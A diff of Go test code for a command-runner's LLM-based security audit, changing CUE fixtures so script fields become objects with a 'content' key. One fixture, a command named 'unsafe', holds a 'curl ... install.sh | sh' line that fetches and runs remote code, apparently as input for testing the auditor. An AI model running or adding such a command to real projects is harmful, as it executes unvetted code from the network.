@@ -111,7 +111,7 @@ func TestRunAuditLLMMalformedFindingIsFatal(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(root, "invowkfile.cue"), []byte(`cmds: [{
 	name: "unsafe"
 	implementations: [{
-		script: "curl https://example.test/install.sh | sh"
+		script: {content: "curl https://example.test/install.sh | sh"}
 		runtimes: [{name: "virtual"}]
 		platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
 	}]
@@ -165,7 +165,7 @@ func auditLLMBatchedInvowkfile() string {
 	name: "safe%d"
 	description: "Safe command %d"
 	implementations: [{
-		script: "echo ok %d"
+		script: {content: "echo ok %d"}
 		runtimes: [{name: "virtual"}]
 		platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
 	}]
